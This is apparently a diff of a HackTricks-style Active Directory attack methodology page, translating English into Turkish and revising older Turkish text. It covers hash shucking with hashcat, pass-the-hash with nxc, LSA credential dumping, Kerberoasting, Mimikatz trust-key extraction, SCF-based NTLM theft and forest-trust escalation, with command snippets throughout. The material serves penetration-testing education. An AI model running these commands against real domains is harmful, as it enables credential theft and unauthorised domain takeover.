-- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
-- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
-- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
-- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.
+- NT-candidate girişleri **ham 32-hex NT hash** olarak kalmalıdır. Rule engine’leri devre dışı bırakın (`-r` yok, hybrid mode yok), çünkü mangling candidate key material’i bozar.
+- Bu modlar doğası gereği daha hızlı değildir, ancak NTLM keyspace’i (M3 Max üzerinde yaklaşık 30,000 MH/s) Kerberos RC4’ten (~300 MH/s) yaklaşık 100× daha hızlıdır. Seçilmiş bir NT listesi test etmek, yavaş formatta tüm password space’i taramaktan çok daha ucuzdur.
+- Her zaman **en güncel Hashcat build**’ini çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`) çünkü modes 31500/31600/35300/35400 yakın zamanda geldi.
+- AS-REQ Pre-Auth için şu anda NT mode yoktur ve AES etypes (19600/19700) düz metin password gerektirir; çünkü key’leri raw NT hash’lerden değil, UTF-16LE passwords üzerinden PBKDF2 ile türetilir.
 
-#### Example – Kerberoast RC4 (mode 35300)
+#### Örnek – Kerberoast RC4 (mode 35300)
 
-1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):
+1. Düşük yetkili bir user ile hedef SPN için bir RC4 TGS yakalayın (detaylar için Kerberoast sayfasına bakın):
 
 {{#ref}}
 kerberoast.md
@@ -231,47 +269,47 @@ kerberoast.md
 GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
 ```
 
-2. Shuck the ticket with your NT list:
+2. Ticket’ı NT listenizle shuck edin:
 
 ```bash
 hashcat -m 35300 roastable_TGS nt_candidates.txt
 ```
 
-Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.
+Hashcat, RC4 key’i her NT candidate’tan türetir ve `$krb5tgs$23$...` blob’unu doğrular. Bir eşleşme, service account’un mevcut NT hash’lerinizden birini kullandığını doğrular.
 
-3. Immediately pivot via PtH:
+3. Hemen PtH ile pivot yapın:
 
 ```bash
 nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
 ```
 
-You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.
+Gerekirse düz metni daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile de kurtarabilirsiniz.
 
-#### Example – Cached credentials (mode 31600)
+#### Örnek – Cached credentials (mode 31600)
 
-1. Dump cached logons from a compromised workstation:
+1. Ele geçirilmiş bir workstation’dan cached logons dump edin:
 
 ```bash
 nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
 ```
 
-2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:
+2. İlgili domain user için DCC2 satırını `dcc2_highpriv.txt` içine kopyalayın ve shuck edin:
 
 ```bash
 hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
 ```
 
-3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.
+3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash’i üretir ve cached user’ın password reuse yaptığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string’i kurtarmak için hızlı NTLM mode’da brute-force edin.
 
-The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.
+Aynı iş akışı NetNTLM challenge-responses (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Eşleşme bulunduğunda relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash’i maskeler/rules ile offline olarak yeniden crack edebilirsiniz.
 
 
 
 ## Enumerating Active Directory WITH credentials/session
 
-For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.
+Bu aşama için **compromised credentials** veya geçerli bir domain account’un session’ını ele geçirmiş olmanız gerekir. Geçerli credentials’ınız veya domain user olarak bir shell’iniz varsa, **önceki seçeneklerin hâlâ diğer user’ları compromise etmek için kullanılabilir olduğunu** unutmamalısınız.
 
-Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**
+Authenticated enumeration’a başlamadan önce **Kerberos double hop problem**’inin ne olduğunu bilmelisiniz.
 
 
 {{#ref}}
@@ -280,33 +318,33 @@ kerberos-double-hop-problem.md
 
 ### Enumeration
 
-Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**
+Bir account’u compromise etmek, **tüm domain’i compromise etmeye başlamak için büyük bir adımdır**, çünkü artık **Active Directory Enumeration** yapmaya başlayabilirsiniz:
 
-Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.
+[**ASREPRoast**](asreproast.md) açısından artık olası her vulnerable user’ı bulabilirsiniz ve [**Password Spraying**](password-spraying.md) açısından ise **tüm username’lerin bir listesini** alıp compromise edilen account’un şifresini, boş şifreleri ve yeni umut verici şifreleri deneyebilirsiniz.
 
-- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
-- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
-- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
-- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
-- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
-- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
-- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
-- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
-- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
-- You could also try automated tools as:
+- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) kullanabilirsiniz
+- Daha stealthy olduğu için [**powershell for recon**](../basic-powershell-for-pentesters/index.html) da kullanabilirsiniz
+- Daha ayrıntılı bilgi çıkarmak için [**use powerview**](../basic-powershell-for-pentesters/powerview.md) da kullanabilirsiniz
+- Active directory’de recon için bir diğer harika tool [**BloodHound**](bloodhound.md). Çok stealthy değildir (kullandığınız collection methods’a bağlı olarak), ama **bununla ilgilenmiyorsanız**, kesinlikle denemelisiniz. User’ların nereden RDP yapabildiğini, diğer gruplara giden path’leri vb. bulun.
+- **Diğer otomatik AD enumeration tools şunlardır:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
+- **AD’nin DNS records**’ları da ilginç bilgi içerebilir.
+- Directory’yi enumerate etmek için kullanabileceğiniz **GUI’li bir tool**: **SysInternal** Suite’ten **AdExplorer.exe**.
+- LDAP database içinde **ldapsearch** ile _userPassword_ ve _unixUserPassword_ alanlarında, hatta _Description_ içinde credentials arayabilirsiniz. Diğer yöntemler için cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
+- Eğer **Linux** kullanıyorsanız, domain’i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de enumerate edebilirsiniz.
+- Ayrıca şu automated tools’ları da deneyebilirsiniz:
 - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
 - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
-- **Extracting all domain users**
+- **Tüm domain user’larını çıkarmak**
 
-It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`
+Windows’tan tüm domain usernames’lerini almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux’ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`
 
-> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.
+> Bu Enumeration bölümü küçük görünse bile en önemli kısımdır. Linkleri açın (özellikle cmd, powershell, powerview ve BloodHound olanları), bir domain’in nasıl enumerate edileceğini öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında bu, DA’ya ulaşmanın yolunu bulmak veya hiçbir şey yapılamayacağına karar vermek için kilit an olacaktır.
 
 ### Kerberoast
 
-Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.
+Kerberoasting, kullanıcı account’larına bağlı service’ler tarafından kullanılan **TGS tickets** elde etmeyi ve bunların encryption’ını crack etmeyi içerir — bu encryption user passwords’a dayanır — **offline**.
 
-More about this in:
+Bunun hakkında daha fazlası için:
 
 
 {{#ref}}
@@ -315,17 +353,17 @@ kerberoast.md
 
 ### Remote connexion (RDP, SSH, FTP, Win-RM, etc)
 
-Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.
+Bazı credentials elde ettikten sonra herhangi bir **machine**’e erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için, port scan’lerinize uygun olarak farklı protocol’lerle birkaç server’a bağlanmayı denemek için **CrackMapExec** kullanabilirsiniz.
 
 ### Local Privilege Escalation
 
-If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).
+Eğer compromised credentials veya regular domain user olarak bir session elde ettiyseniz ve bu user ile domain içindeki **herhangi bir machine**’e **access** sahibiyseniz, local olarak privileges yükseltmenin ve credentials looting yapmanın yollarını aramalısınız. Bunun nedeni, yalnızca local administrator privileges ile memory’de (LSASS) ve local olarak (SAM) **diğer user’ların hash’lerini dump** edebilmenizdir.
 
-There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).
+Bu kitapta [**Windows’ta local privilege escalation**](../windows-local-privilege-escalation/index.html) ve bir [**checklist**](../checklist-windows-privilege-escalation.md) hakkında eksiksiz bir sayfa var. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.
 
 ### Current Session Tickets
 
-It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
+Geçerli user’da size beklenmedik resources’lara erişim izni veren **tickets** bulmanız çok **olası değildir**, ancak şunları kontrol edebilirsiniz:
 ```bash
 ## List all tickets (if not admin, only current user tickets)
 .\Rubeus.exe triage
@@ -335,17 +373,17 @@ It's very **unlikely** that you will find **tickets** in the current user **givi
 ```
 ### NTLM Relay
 
-Active directory'yi enumerate etmeyi başardıysanız, **daha fazla e-postanız** ve **ağ hakkında daha iyi bir anlayışınız** olur. **NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** zorlayabilirsiniz.**
+Eğer active directory’yi enumerate etmeyi başardıysan, **daha fazla e-postaya ve ağın daha iyi bir anlayışına** sahip olursun. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.** zorlamayı deneyebilirsin
 
 ### Looks for Creds in Computer Shares | SMB Shares
 
-Şimdi bazı temel credentials'lara sahip olduğunuza göre, AD içinde paylaşılan herhangi bir **ilginç dosya** bulup bulamayacağınızı kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz ama bu çok sıkıcı, tekrarlayan bir iştir (ve yüzlerce belge kontrol etmeniz gerekiyorsa daha da kötü).
+Artık bazı temel credentials’a sahip olduğuna göre, **AD içinde paylaşılan herhangi bir ilginç dosya** bulup bulamayacağını kontrol etmelisin. Bunu manuel yapabilirsin ama bu çok sıkıcı, tekrarlayan bir iştir (özellikle kontrol etmen gereken yüzlerce doküman bulursan).
 
-[**Kullanabileceğiniz tool'lar hakkında öğrenmek için bu linki takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)
+[**Kullanabileceğin tools hakkında bilgi edinmek için bu bağlantıyı takip et.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)
 
 ### Steal NTLM Creds
 
-Eğer diğer PC'lere veya share'lere **erişebiliyorsanız**, bir şekilde erişildiğinde size karşı bir NTLM authentication **tetikleyecek** (örneğin bir SCF dosyası gibi) **dosyalar** yerleştirebilirsiniz; böylece crack etmek için **NTLM challenge**'ını **çalabilirsiniz**:
+Eğer başka PC’lere veya shares’e **erişebiliyorsan**, bir SCF dosyası gibi, bir şekilde erişildiğinde sana karşı **NTLM authentication** tetikleyecek **dosyalar yerleştirebilirsin**; böylece onu crack etmek için **NTLM challenge**’ını **çalabilirsin**:
 
 
 {{#ref}}
@@ -354,7 +392,7 @@ Eğer diğer PC'lere veya share'lere **erişebiliyorsanız**, bir şekilde eriş
 
 ### CVE-2021-1675/CVE-2021-34527 PrintNightmare
 
-Bu vulnerability, kimliği doğrulanmış herhangi bir kullanıcının **domain controller'ı compromise etmesine** izin veriyordu.
+Bu vulnerability, kimliği doğrulanmış herhangi bir kullanıcının **domain controller’ı compromise etmesine** izin veriyordu.
 
 
 {{#ref}}
@@ -363,23 +401,23 @@ printnightmare.md
 
 ## Privilege escalation on Active Directory WITH privileged credentials/session
 
-**Aşağıdaki teknikler için sıradan bir domain user yeterli değildir, bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**
+**Aşağıdaki teknikler için sıradan bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**
 
 ### Hash extraction
 
-Umarım [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) dahil relay yapma, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [yerel olarak privileges yükseltme](../windows-local-privilege-escalation/index.html) kullanarak bir **local admin** hesabını compromise etmeyi başarmışsınızdır.\
-Sonra, bellekten ve yereldeki tüm hash'leri dump etme zamanı gelmiştir.\
-[**Hash'leri elde etmenin farklı yolları hakkında bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)
+Umarım [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) relaying dahil, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) kullanarak bir **local admin** hesabını compromise etmeyi başarmışsındır.\
+Sonra, bellekte ve lokal olarak bulunan tüm hash’leri dump etme zamanı.\
+[**Hash’leri elde etmenin farklı yolları hakkında bu sayfayı oku.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)
 
 ### Pass the Hash
 
-**Bir kullanıcının hash'ine sahip olduğunuzda**, onu **taklit etmek** için kullanabilirsiniz.\
-Bu hash'i kullanarak **NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir, **ya da** yeni bir **sessionlogon** oluşturup bu hash'i **LSASS** içine **enjekte** edebilirsiniz; böylece herhangi bir **NTLM authentication** gerçekleştirildiğinde, o **hash kullanılacaktır.** Son seçenek mimikatz'ın yaptığı şeydir.\
-[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)
+**Bir kullanıcının hash’ine sahip olduktan sonra**, onu **taklit etmek** için kullanabilirsin.\
+Bu hash’i kullanarak **NTLM authentication gerçekleştirecek** bir **tool** kullanman gerekir, **veya** yeni bir **sessionlogon** oluşturup bu hash’i **LSASS** içine **inject** edebilirsin; böylece herhangi bir **NTLM authentication** yapıldığında, o hash kullanılır. Son seçenek mimikatz’ın yaptığı şeydir.\
+[**Daha fazla bilgi için bu sayfayı oku.**](../ntlm/index.html#pass-the-hash)
 
 ### Over Pass the Hash/Pass the Key
 
-Bu saldırı, yaygın Pass The Hash'in NTLM protocol üzerinden yapılmasına alternatif olarak, **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, özellikle **NTLM protocol'ün devre dışı bırakıldığı** ve kimlik doğrulama protocol'ü olarak yalnızca **Kerberos'un izin verildiği** ağlarda **faydalı** olabilir.
+Bu saldırı, yaygın Pass The Hash’in NTLM protocol üzerinden yaptığı gibi, **kullanıcının NTLM hash’ini kullanarak Kerberos tickets istemeyi** amaçlar. Bu nedenle, özellikle **NTLM protocol’ünün devre dışı bırakıldığı** ve kimlik doğrulama protokolü olarak yalnızca **Kerberos’un izin verildiği** ağlarda **yararlı** olabilir.
 
 
 {{#ref}}
@@ -388,7 +426,7 @@ over-pass-the-hash-pass-the-key.md
 
 ### Pass the Ticket
 
-**Pass The Ticket (PTT)** saldırı yönteminde, attackers bir kullanıcının password veya hash değerleri yerine **kimlik doğrulama ticket'ını çalar**. Bu çalınan ticket daha sonra **kullanıcıyı taklit etmek** için kullanılır ve ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim sağlar.
+**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, parola ya da hash değerleri yerine **bir kullanıcının authentication ticket’ını çalar**. Çalınan bu ticket daha sonra **kullanıcıyı impersonate etmek** için kullanılır ve ağ içindeki kaynaklar ile hizmetlere yetkisiz erişim sağlar.
 
 
 {{#ref}}
@@ -397,7 +435,7 @@ pass-the-ticket.md
 
 ### Credentials Reuse
 
-Eğer bir **local administrator**'ın **hash**'ine veya **password**'üne sahipseniz, bununla diğer **PC**'lere **yerel olarak login** etmeyi denemelisiniz.
+Eğer bir **local administrator**’ın **hash**’ine veya **password**’üne sahipsen, bununla diğer **PC**’lere **local olarak login** olmayı denemelisin.
 ```bash
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
@@ -739,7 +777,7 @@ Get-DomainForeignUser
 # Get groups inside a domain with users our
 Get-DomainForeignGroupMember
 ```
-### Child-to-Parent forest yetki yükseltme
+### Child-to-Parent forest ayrıcalık yükseltme
 ```bash
 # Fro powerview
 Get-DomainTrust
@@ -752,7 +790,7 @@ TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
 WhenCreated     : 2/19/2021 1:28:00 PM
 WhenChanged     : 2/19/2021 1:28:00 PM
 ```
-Domain trustlarını numaralandırmanın diğer yolları:
+Domain trust ilişkilerini enumerate etmenin diğer yolları:
 ```bash
 # Get DCs
 nltest /dsgetdc:<DOMAIN>
@@ -765,8 +803,8 @@ nltest /dclist:sub.domain.local
 nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
 ```
 > [!WARNING]
-> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
-> You can the one used by the current domain them with:
+> İki trusted key vardır, biri _Child --> Parent_ için, diğeri _Parent_ --> _Child_ için.\
+> Geçerli domain tarafından kullanılanı şu şekilde alabilirsiniz:
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
@@ -775,7 +813,7 @@ nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
 
 #### SID-History Injection
 
-Enterprise admin olarak child/parent domain'e, trust'u SID-History injection ile kötüye kullanarak yükselin:
+trust ile SID-History injection abuse ederek child/parent domain üzerinde Enterprise admin seviyesine yükselin:
 
 
 {{#ref}}
@@ -784,45 +822,45 @@ sid-history-injection.md
 
 #### Exploit writeable Configuration NC
 
-Configuration Naming Context (NC)'nin nasıl exploited edilebileceğini anlamak kritiktir. Configuration NC, Active Directory (AD) ortamlarında tüm forest genelindeki configuration data için merkezi bir repository olarak hizmet eder. Bu data forest içindeki her Domain Controller (DC)'a replicated edilir ve writable DC'ler Configuration NC'nin writable bir kopyasını tutar. Bunu exploited etmek için, bir DC üzerinde **SYSTEM privileges** gerekir, tercihen bir child DC.
+Configuration Naming Context (NC) yapısının nasıl exploit edilebileceğini anlamak kritiktir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki configuration verileri için merkezi bir repository görevi görür. Bu veri, forest içindeki her Domain Controller (DC)'a replike edilir ve writable DC'ler Configuration NC'nin writable bir kopyasını tutar. Bunu exploit etmek için, tercihen bir child DC üzerinde, **SYSTEM privileges** sahibi olmak gerekir.
 
 **Link GPO to root DC site**
 
-Configuration NC'nin Sites container'ı, AD forest içindeki domain-joined tüm computer'ların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak attackers, GPO'ları root DC sites'e link edebilir. Bu işlem, bu sitelere uygulanan policies'i manipulate ederek root domain'i potansiyel olarak compromise eder.
+Configuration NC'nin Sites container'ı, AD forest içindeki domain-joined tüm bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak, saldırganlar root DC sites'e GPO bağlayabilir. Bu işlem, bu sitelere uygulanan policy'leri manipüle ederek root domain'i ele geçirebilir.
 
-Derinlemesine bilgi için [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) üzerine araştırmayı inceleyebilirsiniz.
+Detaylı bilgi için [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) araştırmasına bakılabilir.
 
 **Compromise any gMSA in the forest**
 
-Bir attack vector, domain içindeki privileged gMSA'ları target almaktır. gMSA'ların passwords'larını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde stored edilir. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e access etmek ve forest genelindeki herhangi bir gMSA için passwords'ları compute etmek mümkündür.
+Bir attack vector, domain içindeki privileged gMSA'ları hedef almayı içerir. gMSA'ların password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA'nın password'ünü hesaplamak mümkündür.
 
-Detaylı analysis ve step-by-step guidance şu kaynakta bulunabilir:
+Detaylı analiz ve adım adım rehber şu içerikte bulunabilir:
 
 
 {{#ref}}
 golden-dmsa-gmsa.md
 {{#endref}}
 
-Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):
+Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes abuse):
 
 
 {{#ref}}
 badsuccessor-dmsa-migration-abuse.md
 {{#endref}}
 
-Ek external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).
+Ek dış araştırma: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).
 
 **Schema change attack**
 
-Bu method sabır gerektirir; yeni privileged AD objects'in oluşturulmasını beklemeyi gerektirir. SYSTEM privileges ile attacker, herhangi bir user'a tüm classes üzerinde tam control vermek için AD Schema'yı modify edebilir. Bu, newly created AD objects üzerinde unauthorized access ve control'e yol açabilir.
+Bu yöntem sabır gerektirir ve yeni privileged AD objects oluşmasını beklemeyi içerir. SYSTEM privileges ile bir saldırgan, AD Schema'yı değiştirerek herhangi bir user'a tüm sınıflar üzerinde tam control verebilir. Bu, yeni oluşturulan AD objects üzerinde izinsiz erişim ve control ile sonuçlanabilir.
 
 Daha fazla okuma için [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).
 
 **From DA to EA with ADCS ESC5**
 
-ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication yapılmasını sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) objects üzerindeki control'ü hedef alır. PKI objects Configuration NC içinde bulunduğundan, writable bir child DC'nin compromise edilmesi ESC5 attacks'in yürütülmesini mümkün kılar.
+ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) objects üzerindeki control'ü hedef alır. PKI objects Configuration NC içinde bulunduğundan, writable bir child DC'nin ele geçirilmesi ESC5 attack'lerinin yürütülmesini sağlar.
 
-Bununla ilgili daha fazla detay [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) içinde okunabilir. ADCS olmayan senaryolarda, attacker gerekli bileşenleri kurma yeteneğine sahiptir; bu, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içinde anlatılmıştır.
+Bununla ilgili daha fazla detay [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) içinde okunabilir. ADCS olmayan senaryolarda, attacker gerekli bileşenleri kurma yeteneğine sahiptir; bu konu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içinde tartışılmaktadır.
 
 ### External Forest Domain - One-Way (Inbound) or bidirectional
 ```bash
@@ -835,7 +873,7 @@ TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 ```
-Bu senaryoda **alanınız**, dış bir alan tarafından **güveniliyor** ve bu size onun üzerinde **belirsiz izinler** veriyor. Bulmanız gereken şey, **alanınızdaki hangi principal’lerin dış alan üzerinde hangi erişime sahip olduğu** ve ardından bunu istismar etmeye çalışmaktır:
+Bu senaryoda **domain’iniz güvenilir** olan harici bir domain tarafından size üzerinde **belirsiz yetkiler** veriliyor. **Domain’inizdeki hangi principal’ların harici domain üzerinde hangi erişime sahip olduğunu** bulmanız ve ardından bunu istismar etmeye çalışmanız gerekecek:
 
 
 {{#ref}}
@@ -854,19 +892,19 @@ TrustDirection  : Outbound        --> Outbound trust
 WhenCreated     : 2/19/2021 10:15:24 PM
 WhenChanged     : 2/19/2021 10:15:24 PM
 ```
-Bu senaryoda **domaininiz**, başka **domainlerden** gelen bir principal’a bazı **privileges** vererek ona **güveniyor**.
+Bu senaryoda **alanınız**, **farklı alanlardan** bir gruba bazı **ayrıcalıklar** veriyor ve buna **güveniyor**.
 
-Ancak, **trusted domain** tarafından bir **domain trusted** olduğunda, trusted domain **öngörülebilir bir isim** ile bir kullanıcı **oluşturur** ve bunu **trusted password**'ü parola olarak kullanır. Bu da, trusting domain içindeki bir kullanıcıya erişip trusted olanın içine girmek, onu enumerate etmek ve daha fazla privilege yükseltmeyi denemek için mümkün olduğu anlamına gelir:
+Ancak, **bir alan başka bir alan tarafından trusted** edildiğinde, trusted alan **öngörülebilir bir ada sahip bir kullanıcı** oluşturur ve bunu **trusted password** ile **parola** olarak kullanır. Bu da, **trusting domain** içindeki bir kullanıcıya erişip trusted olanın içine girmek, onu enumerate etmek ve daha fazla ayrıcalık yükseltmeyi denemek için mümkün olduğu anlamına gelir:
 
 
 {{#ref}}
 external-forest-domain-one-way-outbound.md
 {{#endref}}
 
-Trusted domain’i ele geçirmenin başka bir yolu da, domain trust’ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).
